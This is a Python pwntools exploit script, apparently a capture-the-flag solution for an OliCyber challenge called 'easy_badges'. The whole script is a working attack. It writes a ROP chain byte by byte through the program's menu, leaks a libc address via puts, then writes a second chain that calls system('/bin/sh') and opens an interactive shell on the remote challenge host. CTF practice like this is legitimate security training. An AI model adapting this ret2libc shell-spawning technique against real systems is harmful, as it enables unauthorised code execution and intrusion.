#!/usr/bin/env python3

from pwn import *

exe = ELF("./easy_badges_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.REMOTE:
        r = remote("easybadges.challs.nazionale.olicyber.it", 31500)
    else:
        r = gdb.debug([exe.path], '''
            b *edit_badge+283
            b *a+19
            c           
        ''')
    return r

POP_RDI = 0x401249
STDERR_PTR = 0x404040
EDIT_BADGE = 0x401549 # skippo il memset

def main():
    r = conn()

    rop = b''.join([
        p64(POP_RDI),
        p64(STDERR_PTR),
        p64(exe.sym["puts"]), # leakko libc
        p64(exe.sym["edit_badge"])
    ])

    r.sendlineafter(b'> : ', b'1')
    r.sendlineafter(b'Steps: ', str(64 + 8 * 3 - 1).encode())

    for i in rop:
        r.sendlineafter(b'> : ', b'1')
        r.sendlineafter(b'Steps: ', b'1')
        r.sendlineafter(b'> : ', b'4')
        r.sendlineafter(b'Byte: ', str(i).encode())
    
    r.sendlineafter(b'> : ', b'6')
    
    r.recvuntil(b'> ')
    r.recvline()
    
    addr = r.recvline(drop=True).ljust(8, b'\0')
    print(addr)
    libc.address = u64(addr) - (0x203000 + 0x14e0)
    print("LIBC: ", hex(libc.address))
    

    rop = b''.join([
        p64(POP_RDI),
        p64(next(libc.search('/bin/sh\x00'))),
        p64(0x4013C4), # ret
        p64(libc.sym["system"])
    ])

    r.sendlineafter(b'> : ', b'1')
    r.sendlineafter(b'Steps: ', str(64 + 8 * 3 - 1).encode())

    for i in rop:
        r.sendlineafter(b'> : ', b'1')
        r.sendlineafter(b'Steps: ', b'1')
        r.sendlineafter(b'> : ', b'4')
        r.sendlineafter(b'Byte: ', str(i).encode())
    
    r.sendlineafter(b'> : ', b'6')
    
    r.recvuntil(b'> ')
    r.recvline()

    r.interactive()


if __name__ == "__main__":
    main()
